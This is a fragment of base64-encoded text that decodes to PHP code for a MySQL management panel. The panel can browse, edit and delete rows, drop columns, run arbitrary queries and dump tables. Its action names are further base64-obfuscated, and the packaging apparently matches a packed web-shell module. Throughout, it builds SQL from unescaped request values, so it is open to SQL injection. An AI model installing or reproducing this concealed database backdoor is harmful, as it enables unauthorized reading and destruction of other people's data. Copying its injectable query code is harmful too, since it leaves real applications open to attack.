XJyYXkoJHJlc3VsdCkgKQ0KCQlpZiggJHJvd1siS2V5X25hbWUiXSA9PSAiUFJJTUFSWSIgKSB7DQoJCQlpZiggJHJvd1tDb2x1bW5fbmFtZV0gPT0gJG5hbWUgKQ0KCQkJCSRrZXlDaGFuZ2UgPSB0cnVlOw0KCQkJZWxzZQ0KCQkJCSRwcmltYXJ5IC49ICIsICRyb3dbQ29sdW1uX25hbWVdIjsNCgkJfQ0KCWlmKCAkcHJpbWFyeV9rZXkgPT0gIlBSSU1BUlkgS0VZIiApIHsNCgkJJHByaW1hcnkgLj0gIiwgJG5hbWUiOw0KCQkka2V5Q2hhbmdlID0gISRrZXlDaGFuZ2U7DQoJfQ0KCSRwcmltYXJ5ID0gc3Vic3RyKCAkcHJpbWFyeSwgMiApOw0KCWlmKCAka2V5Q2hhbmdlID09IHRydWUgKSB7DQoJCSRxID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgRFJPUCBQUklNQVJZIEtFWSI7DQoJCW15c3FsX3F1ZXJ5KCAkcSApOw0KCQkkcXVlcnlTdHIgLj0gIjxicj5cbiIgLiAkcTsNCgkJJGVyck1zZyAuPSAiPGJyPlxuIiAuIG15c3FsX2Vycm9yKCk7DQoJCSRxID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgQUREIFBSSU1BUlkgS0VZKCAkcHJpbWFyeSApIjsNCgkJbXlzcWxfcXVlcnkoICRxICk7DQoJCSRxdWVyeVN0ciAuPSAiPGJyPlxuIiAuICRxOw0KCQkkZXJyTXNnIC49ICI8YnI+XG4iIC4gbXlzcWxfZXJyb3IoKTsNCgl9DQoJdmlld1NjaGVtYSgpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wRmllbGQoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJGZpZWxkbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgRFJPUCBDT0xVTU4gJGZpZWxkbmFtZSI7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglteXNxbF9xdWVyeSggJHF1ZXJ5U3RyICwgJG15c3FsSGFuZGxlICk7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJdmlld1NjaGVtYSgpOw0KfQ0KDQpmdW5jdGlvbiB2aWV3RGF0YSggJHF1ZXJ5U3RyICkgew0KCWdsb2JhbCAkYWN0aW9uLCAkbXlzcWxIYW5kbGUsICRkYm5hbWUsICR0YWJsZW5hbWUsICRQSFBfU0VMRiwgJGVyck1zZywgJHBhZ2UsICRyb3dwZXJwYWdlLCAkb3JkZXJieTsNCgllY2hvICI8aDE+RGF0YSBpbiBUYWJsZTwvaDE+XG4iOw0KCWlmKCAkdGFibGVuYW1lICE9ICIiICkNCgkJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZSAmZ3Q7ICR0YWJsZW5hbWU8L3A+XG4iOw0KCWVsc2UNCgkJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZTwvcD5cbiI7DQoJJHF1ZXJ5U3RyID0gc3RyaXBzbGFzaGVzKCAkcXVlcnlTdHIgKTsNCglpZiggJHF1ZXJ5U3RyID09ICIiICkgew0KCQkkcXVlcnlTdHIgPSAiU0VMRUNUICogRlJPTSAkdGFibGVuYW1lIjsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICkNCgkJCSRxdWVyeVN0ciAuPSAiIE9SREVSIEJZICRvcmRlcmJ5IjsNCgkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1hZGREYXRhJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5BZGQgRGF0YTwvYT4gfCBcbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dmlld1NjaGVtYSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+U2NoZW1hPC9hPlxuIjsNCgl9DQoJJHBSZXN1bHQgPSBteXNxbF9kYl9xdWVyeSggJGRibmFtZSwgJHF1ZXJ5U3RyICk7DQoJJGZpZWxkdCA9IG15c3FsX2ZldGNoX2ZpZWxkKCRwUmVzdWx0KTsNCgkkdGFibGVuYW1lID0gJGZpZWxkdC0+dGFibGU7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJJEdMT0JBTFNbcXVlcnlTdHJdID0gJHF1ZXJ5U3RyOw0KCWlmKCAkcFJlc3VsdCA9PSBmYWxzZSApIHsNCgkJZWNob1F1ZXJ5UmVzdWx0KCk7DQoJCXJldHVybjsNCgl9DQoJaWYoICRwUmVzdWx0ID09IDEgKSB7DQoJCSRlcnJNc2cgPSAiU3VjY2VzcyI7DQoJCWVjaG9RdWVyeVJlc3VsdCgpOw0KCQlyZXR1cm47DQoJfQ0KCWVjaG8gIjxocj5cbiI7DQoJJHJvdyA9IG15c3FsX251bV9yb3dzKCAkcFJlc3VsdCApOw0KCSRjb2wgPSBteXNxbF9udW1fZmllbGRzKCAkcFJlc3VsdCApOw0KCWlmKCAkcm93ID09IDAgKSB7DQoJCWVjaG8gIk5vIERhdGEgRXhpc3QhIjsNCgkJcmV0dXJuOw0KCX0NCglpZiggJHJvd3BlcnBhZ2UgPT0gIiIgKSAkcm93cGVycGFnZSA9IDMwOw0KCWlmKCAkcGFnZSA9PSAiIiApICRwYWdlID0gMDsNCgllbHNlICRwYWdlLS07DQoJbXlzcWxfZGF0YV9zZWVrKCAkcFJlc3VsdCwgJHBhZ2UgKiAkcm93cGVycGFnZSApOw0KCWVjaG8gIjx0YWJsZSBjZWxsc3BhY2luZz0xIGNlbGxwYWRkaW5nPTI+XG4iOw0KCWVjaG8gIjx0cj5cbiI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJGNvbDsgJGkrKyApIHsNCgkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaSApOw0KCQllY2hvICI8dGg+IjsNCgkJaWYoJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IikNCgkJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJm9yZGVyYnk9Ii4kZmllbGQtPm5hbWUuIic+Ii4kZmllbGQtPm5hbWUuIjwvYT5cbiI7DQoJCWVsc2UNCgkJCWVjaG8gJGZpZWxkLT5uYW1lLiJcbiI7DQoJCWVjaG8gIjwvdGg+XG4iOw0KCX0NCgllY2hvICI8dGggY29sc3Bhbj0yPkFjdGlvbjwvdGg+XG4iOw0KCWVjaG8gIjwvdHI+XG4iOw0KCWZvciggJGkgPSAwOyAkaSA8ICRyb3dwZXJwYWdlOyAkaSsrICkgew0KCQkkcm93QXJyYXkgPSBteXNxbF9mZXRjaF9yb3coICRwUmVzdWx0ICk7DQoJCWlmKCAkcm93QXJyYXkgPT0gZmFsc2UgKSBicmVhazsNCgkJZWNobyAiPHRyPlxuIjsNCgkJJGtleSA9ICIiOw0KCQlmb3IoICRqID0gMDsgJGogPCAkY29sOyAkaisrICkgew0KCQkJJGRhdGEgPSAkcm93QXJyYXlbJGpdOw0KCQkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaiApOw0KCQkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQkJJGtleSAuPSAiJiIgLiAkZmllbGQtPm5hbWUgLiAiPSIgLiAkZGF0YTsNCgkJCWlmKCBzdHJsZW4oICRkYXRhICkgPiAzMCApDQoJCQkJJGRhdGEgPSBzdWJzdHIoICRkYXRhLCAwLCAzMCApIC4gIi4uLiI7DQoJCQkkZGF0YSA9IGh0bWxzcGVjaWFsY2hhcnMoICRkYXRhICk7DQoJCQllY2hvICI8dGQ+XG4iOw0KCQkJZWNobyAiJGRhdGFcbiI7DQoJCQllY2hvICI8L3RkPlxuIjsNCgkJfQ0KCQlpZiggJGtleSA9PSAiIiApDQoJCQllY2hvICI8dGQgY29sc3Bhbj0yPm5vIEtleTwvdGQ+XG4iOw0KCQllbHNlIHsNCgkJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWVkaXREYXRhJGtleSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+RWRpdDwvYT48L3RkPlxuIjsNCgkJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWRlbGV0ZURhdGEka2V5JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0RlbGV0ZSBSb3c/JylcIj5EZWxldGU8L2E+PC90ZD5cbiI7DQoJCX0NCgkJZWNobyAiPC90cj5cbiI7DQoJfQ0KCWVjaG8gIjwvdGFibGU+XG4iOw0KCWVjaG8gIjxmb250IHNpemU9MiBjbGFzcz1cIm5ld1wiPlxuIjsNCglpZigkYWN0aW9uID09ICJkbWxsZDBSaGRHRT0iKQ0KCQllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBtZXRob2Q9cG9zdD5cbiI7DQoJZWxzZQ0KCQllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRj9hY3Rpb249cXVlcnkmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmcXVlcnlTdHI9JHF1ZXJ5U3RyJyBtZXRob2Q9cG9zdD5cbiI7DQoJZWNobyAoJHBhZ2UrMSkuIi8iLihpbnQpKCRyb3cvJHJvd3BlcnBhZ2UrMSkuIiBwYWdlIjsNCgllY2hvICI8L2ZvbnQ+XG4iOw0KCWVjaG8gIiB8ICI7DQoJaWYoICRwYWdlID4gMCApIHsNCgkJaWYoJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IikNCgkJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJnBhZ2U9Ii4oJHBhZ2UpOw0KCQllbHNlDQoJCQllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXF1ZXJ5JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJnF1ZXJ5U3RyPSRxdWVyeVN0ciZwYWdlPSIuKCRwYWdlKTsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICYmICRhY3Rpb24gPT0gImRtbGxkMFJoZEdFPSIpDQoJCQllY2hvICImb3JkZXJieT0kb3JkZXJieSI7DQoJCWVjaG8gIic+UHJldjwvYT5cbiI7DQoJfSBlbHNlDQoJCWVjaG8gIjxmb250IHNpemU9MiBjbGFzcz1cIm5ld1wiPlByZXY8L2ZvbnQ+IjsNCgllY2hvICIgfCAiOw0KCWlmKCAkcGFnZSA8ICgkcm93LyRyb3dwZXJwYWdlKS0xICkgew0KCQlpZigkYWN0aW9uID09ICJkbWxsZDBSaGRHRT0iKQ0KCQkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kbWxsZDBSaGRHRT0mZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmcGFnZT0iLigkcGFnZSsyKTsNCgkJZWxzZQ0KCQkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1xdWVyeSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSZxdWVyeVN0cj0kcXVlcnlTdHImcGFnZT0iLigkcGFnZSsyKTsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICYmICRhY3Rpb24gPT0gImRtbGxkMFJoZEdFPSIpDQoJCQllY2hvICImb3JkZXJieT0kb3JkZXJieSI7DQoJCWVjaG8gIic+TmV4dDwvYT5cbiI7DQoJfSBlbHNlDQoJCWVjaG8gIk5leHQiOw0KCWVjaG8gIiB8ICI7DQoJaWYoICRyb3cgPiAkcm93cGVycGFnZSApIHsNCgkJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBzaXplPTQgbmFtZT1wYWdlPlxuIjsNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdHbyc+XG4iOw0KCX0NCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjwvZm9udD5cbiI7DQp9DQoNCmZ1bmN0aW9uIG1hbmFnZURhdGEoICRjbWQgKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGgxPkFkZCBEYXRhPC9oMT5cbiI7DQoJZWxzZSBpZiggJGNtZCA9PSAiZWRpdCIgKSB7DQoJCWVjaG8gIjxoMT5FZGl0IERhdGE8L2gxPlxuIjsNCgkJJHBSZXN1bHQgPSBteXNxbF9saXN0X2ZpZWxkcyggJGRibmFtZSwgJHRhYmxlbmFtZSApOw0KCQkkbnVtID0gbXlzcWxfbnVtX2ZpZWxkcyggJHBSZXN1bHQgKTsNCgkJJGtleSA9ICIiOw0KCQlmb3IoICRpID0gMDsgJGkgPCAkbnVtOyAkaSsrICkgew0KCQkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaSApOw0KCQkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQkJaWYoICRmaWVsZC0+bnVtZXJpYyA9PSAxICkNCgkJCQkJJGtleSAuPSAkZmllbGQtPm5hbWUgLiAiPSIgLiAkR0xPQkFMU1skZmllbGQtPm5hbWVdIC4gIiBBTkQgIjsNCgkJCQllbHNlDQoJCQkJCSRrZXkgLj0gJGZpZWxkLT5uYW1lIC4gIj0nIiAuICRHTE9CQUxTWyRmaWVsZC0+bmFtZV0gLiAiJyBBTkQgIjsNCgkJfQ0KCQkka2V5ID0gc3Vic3RyKCAka2V5LCAwLCBzdHJsZW4oJGtleSktNCApOw0KCQlteXNxbF9zZWxlY3RfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCQkkcFJlc3VsdCA9IG15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIgPSAgIlNFTEVDVCAqIEZST00gJHRhYmxlbmFtZSBXSEVSRSAka2V5IiwgJG15c3FsSGFuZGxlICk7DQoJCSRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoICRwUmVzdWx0ICk7DQoJfQ0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRicgbWV0aG9kPXBvc3Q+XG4iOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWFkZERhdGFfc3VibWl0PlxuIjsNCgllbHNlIGlmKCAkY21kID09ICJlZGl0IiApDQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1lZGl0RGF0YV9zdWJtaXQ+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT10YWJsZW5hbWUgdmFsdWU9JHRhYmxlbmFtZT5cbiI7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9Mj5cbiI7DQoJZWNobyAiPHRyPlxuIjsNCgllY2hvICI8dGg+TmFtZTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5UeXBlPC90aD5cbiI7DQoJZWNobyAiPHRoPkZ1bmN0aW9uPC90aD5cbiI7DQoJZWNobyAiPHRoPkRhdGE8L3RoPlxuIjsNCgllY2hvICI8L3RyPlxuIjsNCgkkcFJlc3VsdCA9IG15c3FsX2RiX3F1ZXJ5KCAkZGJuYW1lLCAiU0hPVyBmaWVsZHMgRlJPTSAkdGFibGVuYW1lIiApOw0KCSRudW0gPSBteXNxbF9udW1fcm93cyggJHBSZXN1bHQgKTsNCgkkcFJlc3VsdExlbiA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bTsgJGkrKyApIHsNCgkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfYXJyYXkoICRwUmVzdWx0ICk7DQoJCSRmaWVsZG5hbWUgPSAkZmllbGRbIkZpZWxkIl07DQoJCSRmaWVsZHR5cGUgPSAkZmllbGRbIlR5cGUiXTsNCgkJJGxlbiA9IG15c3FsX2ZpZWxkX2xlbiggJHBSZXN1bHRMZW4sICRpICk7DQoJCWVjaG8gIjx0cj4iOw0KCQllY2hvICI8dGQ+JGZpZWxkbmFtZTwvdGQ+IjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJUeXBlIl0uIjwvdGQ+IjsNCgkJZWNobyAiPHRkPlxuIjsNCgkJZWNobyAiPHNlbGVjdCBuYW1lPSR7ZmllbGRuYW1lfV9mdW5jdGlvbj5cbiI7DQoJCWVjaG8gIjxvcHRpb24+XG4iOw0KCQllY2hvICI8b3B0aW9uPkFTQ0lJXG4iOw0KCQllY2hvICI8b3B0aW9uPkNIQVJcbiI7DQoJCWVjaG8gIjxvcHRpb24+U09VTkRFWFxuIjsNCgkJZWNobyAiPG9wdGlvbj5DVVJEQVRFXG4iOw0KCQllY2hvICI8b3B0aW9uPkNVUlRJTUVcbiI7DQoJCWVjaG8gIjxvcHRpb24+RlJPTV9EQVlTXG4iOw0KCQllY2hvICI8b3B0aW9uPkZST01fVU5JWFRJTUVcbiI7DQoJCWVjaG8gIjxvcHRpb24+Tk9XXG4iOw0KCQllY2hvICI8b3B0aW9uPlBBU1NXT1JEXG4iOw0KCQllY2hvICI8b3B0aW9uPlBFUklPRF9BRERcbiI7DQoJCWVjaG8gIjxvcHRpb24+UEVSSU9EX0RJRkZcbiI7DQoJCWVjaG8gIjxvcHRpb24+VE9fREFZU1xuIjsNCgkJZWNobyAiPG9wdGlvbj5VU0VSXG4iOw0KCQllY2hvICI8b3B0aW9uPldFRUtEQVlcbiI7DQoJCWVjaG8gIjxvcHRpb24+UkFORFxuIjsNCgkJZWNobyAiPC9zZWxlY3Q+XG4iOw0KCQllY2hvICI8L3RkPlxuIjsNCgkJJHZhbHVlID0gaHRtbHNwZWNpYWxjaGFycygkZGF0YVskaV0pOw0KCQlpZiggJGNtZCA9PSAiYWRkIiApIHsNCgkJCSR0eXBlID0gc3RydG9rKCAkZmllbGR0eXBlLCAiICgsKVxuIiApOw0KCQkJaWYoICR0eXBlID09ICJlbnVtIiB8fCAkdHlwZSA9PSAic2V0IiApIHsNCgkJCQllY2hvICI8dGQ+XG4iOw0KCQkJCWlmKCAkdHlwZSA9PSAiZW51bSIgKQ0KCQkJCQllY2hvICI8c2VsZWN0IG5hbWU9JGZpZWxkbmFtZT5cbiI7DQoJCQkJZWxzZSBpZiggJHR5cGUgPT0gInNldCIgKQ0KCQkJCQllY2hvICI8c2VsZWN0IG5hbWU9JGZpZWxkbmFtZSBzaXplPTQgbXVsdGlwbGU+XG4iOw0KCQkJCXdoaWxlKCAkc3RyID0gc3RydG9rKCAiJyIgKSApIHsNCgkJCQkJZWNobyAiPG9wdGlvbj4kc3RyXG4iOw0KCQkJCQlzdHJ0b2soICInIiApOw0KCQkJCX0NCgkJCQllY2hvICI8L3NlbGVjdD5cbiI7DQoJCQkJZWNobyAiPC90ZD5cbiI7DQoJCQl9IGVsc2Ugew0KCQkJCWlmKCAkbGVuIDwgNDAgKQ0KCQkJCQllY2hvICI8dGQ+PGlucHV0IHR5cGU9dGV4dCBzaXplPTQwIG1heGxlbmd0aD0kbGVuIG5hbWU9JGZpZWxkbmFtZT48L3RkPlxuIjsNCgkJCQllbHNlDQoJCQkJCWVjaG8gIjx0ZD48dGV4dGFyZWEgY29scz00MCByb3dzPTMgbWF4bGVuZ3RoPSRsZW4gbmFtZT0kZmllbGRuYW1lPjwvdGV4dGFyZWE+XG4iOw0KCQkJfQ0KCQl9IGVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQkJJHR5cGUgPSBzdHJ0b2soICRmaWVsZHR5cGUsICIgKCwpXG4iICk7DQoJCQlpZiggJHR5cGUgPT0gImVudW0iIHx8ICR0eXBlID09ICJzZXQiICkgew0KCQkJCWVjaG8gIjx0ZD5cbiI7DQoJCQkJaWYoICR0eXBlID09ICJlbnVtIiApDQoJCQkJCWVjaG8gIjxzZWxlY3QgbmFtZT0kZmllbGRuYW1lPlxuIjsNCgkJCQllbHNlIGlmKCAkdHlwZSA9PSAic2V0IiApDQoJCQkJCWVjaG8gIjxzZWxlY3QgbmFtZT0kZmllbGRuYW1lIHNpemU9NCBtdWx0aXBsZT5cbiI7DQoJCQkJd2hpbGUoICRzdHIgPSBzdHJ0b2soICInIiApICkgew0KCQkJCQlpZiggJHZhbHVlID09ICRzdHIgKQ0KCQkJCQkJZWNobyAiPG9wdGlvbiBzZWxlY3RlZD4kc3RyXG4iOw0KCQkJCQllbHNlDQoJCQkJCQllY2hvICI8b3B0aW9uPiRzdHJcbiI7DQoJCQkJCXN0cnRvayggIiciICk7DQoJCQkJfQ0KCQkJCWVjaG8gIjwvc2VsZWN0PlxuIjsNCgkJCQllY2hvICI8L3RkPlxuIjsNCgkJCX0gZWxzZSB7DQoJCQkJaWYoICRsZW4gPCA0MCApDQoJCQkJCWVjaG8gIjx0ZD48aW5wdXQgdHlwZT10ZXh0IHNpemU9NDAgbWF4bGVuZ3RoPSRsZW4gbmFtZT0kZmllbGRuYW1lIHZhbHVlPVwiJHZhbHVlXCI+PC90ZD5cbiI7DQoJCQkJZWxzZQ0KCQkJCQllY2hvICI8dGQ+PHRleHRhcmVhIGNvbHM9NDAgcm93cz0zIG1heGxlbmd0aD0kbGVuIG5hbWU9JGZpZWxkbmFtZT4kdmFsdWU8L3RleHRhcmVhPlxuIjsNCgkJCX0NCgkJfQ0KCQllY2hvICI8L3RyPiI7DQoJfQ0KCWVjaG8gIjwvdGFibGU+PHA+XG4iOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdBZGQgRGF0YSc+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFZGl0IERhdGEnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1idXR0b24gdmFsdWU9J0NhbmNlbCcgb25DbGljaz0naGlzdG9yeS5iYWNrKCknPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KfQ0KDQpmdW5jdGlvbiBtYW5hZ2VEYXRhX3N1Ym1pdCggJGNtZCApIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkZmllbGRuYW1lLCAkUEhQX1NFTEYsICRxdWVyeVN0ciwgJGVyck1zZzsNCgkkcFJlc3VsdCA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJJG51bSA9IG15c3FsX251bV9maWVsZHMoICRwUmVzdWx0ICk7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglpZiggJGNtZCA9PSAiYWRkIiApDQoJCSRxdWVyeVN0ciA9ICJJTlNFUlQgSU5UTyAkdGFibGVuYW1lIFZBTFVFUyAoIjsNCgllbHNlIGlmKCAkY21kID09ICJlZGl0IiApDQoJCSRxdWVyeVN0ciA9ICJSRVBMQUNFIElOVE8gJHRhYmxlbmFtZSBWQUxVRVMgKCI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bS0xOyAkaSsrICkgew0KCQkkZmllbGQgPSBteXNxbF9mZXRjaF9maWVsZCggJHBSZXN1bHQgKTsNCgkJJGZ1bmMgPSAkR0xPQkFMU1skZmllbGQtPm5hbWUuIl9mdW5jdGlvbiJdOw0KCQlpZiggJGZ1bmMgIT0gIiIgKQ0KCQkJJHF1ZXJ5U3RyIC49ICIgJGZ1bmMoIjsNCgkJaWYoICRmaWVsZC0+bnVtZXJpYyA9PSAxICkgew0KCQkJJHF1ZXJ5U3RyIC49ICRHTE9CQUxTWyRmaWVsZC0+bmFtZV07DQoJCQlpZiggJGZ1bmMgIT0gIiIgKQ0KCQkJCSRxdWVyeVN0ciAuPSAiKSwiOw0KCQkJZWxzZQ0KCQkJCSRxdWVyeVN0ciAuPSAiLCI7DQoJCX0gZWxzZSB7DQoJCQkkcXVlcnlTdHIgLj0gIiciIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXTsNCgkJCWlmKCAkZnVuYyAhPSAiIiApDQoJCQkJJHF1ZXJ5U3RyIC49ICInKSwiOw0KCQkJZWxzZQ0KCQkJCSRxdWVyeVN0ciAuPSAiJywiOw0KCQl9DQoJfQ0KCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCApOw0KCWlmKCAkZmllbGQtPm51bWVyaWMgPT0gMSApDQoJCSRxdWVyeVN0ciAuPSAkR0xPQkFMU1skZmllbGQtPm5hbWVdIC4gIikiOw0KCWVsc2UNCgkJJHF1ZXJ5U3RyIC49ICInIiAuICRHTE9CQUxTWyRmaWVsZC0+bmFtZV0gLiAiJykiOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIgLCAkbXlzcWxIYW5kbGUgKTsNCgkkZXJyTXNnID0gbXlzcWxfZXJyb3IoKTsNCgl2aWV3RGF0YSggIiIgKTsNCn0NCg0KZnVuY3Rpb24gZGVsZXRlRGF0YSgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkZmllbGRuYW1lLCAkUEhQX1NFTEYsICRxdWVyeVN0ciwgJGVyck1zZzsNCgkkcFJlc3VsdCA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJJG51bSA9IG15c3FsX251bV9maWVsZHMoICRwUmVzdWx0ICk7DQoJJGtleSA9ICIiOw0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCwgJGkgKTsNCgkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQlpZiggJGZpZWxkLT5udW1lcmljID09IDEgKQ0KCQkJCSRrZXkgLj0gJGZpZWxkLT5uYW1lIC4gIj0iIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXSAuICIgQU5EICI7DQoJCQllbHNlDQoJCQkJJGtleSAuPSAkZmllbGQtPm5hbWUgLiAiPSciIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXSAuICInIEFORCAiOw0KCX0NCgkka2V5ID0gc3Vic3RyKCAka2V5LCAwLCBzdHJsZW4oJGtleSktNCApOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJJHF1ZXJ5U3RyID0gICJERUxFVEUgRlJPTSAkdGFibGVuYW1lIFdIRVJFICRrZXkiOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIsICRteXNxbEhhbmRsZSApOw0KCSRlcnJNc2cgPSBteXNxbF9lcnJvcigpOw0KCXZpZXdEYXRhKCAiIiApOw0KfQ0KDQpmdW5jdGlvbiBmZXRjaF90YWJsZV9kdW1wX3NxbCgkdGFibGUpDQp7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwkZGJuYW1lOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJJHF1ZXJ5X2lkID0gbXlzcWxfcXVlcnkoIlNIT1cgQ1JFQVRFIFRBQkxFICR0YWJsZSIsJG15c3FsSGFuZGxlKTsNCgkkdGFibGVkdW1wID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHF1ZXJ5X2lkLCBNWVNRTF9BU1NPQyk7DQoJJHRhYmxlZHVtcCA9ICJEUk9QIFRBQkxFIElGIEVYSVNUUyAkdGFibGU7XG4iIC4gJHRhYmxlZHVtcFsnQ3JlYXRlIFRhYmxlJ10gLiAiO1xuXG4iOw0KCWVjaG8gJHRhYmxlZHVtcDsNCgkvLyBnZXQgZGF0YQ0KCSRyb3dzID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIEZST00gJHRhYmxlIiwkbXlzcWxIYW5kbGUpOw0KCSRudW1maWVsZHM9bXlzcWxfbnVtX2ZpZWxkcygkcm93cyk7DQoJd2hp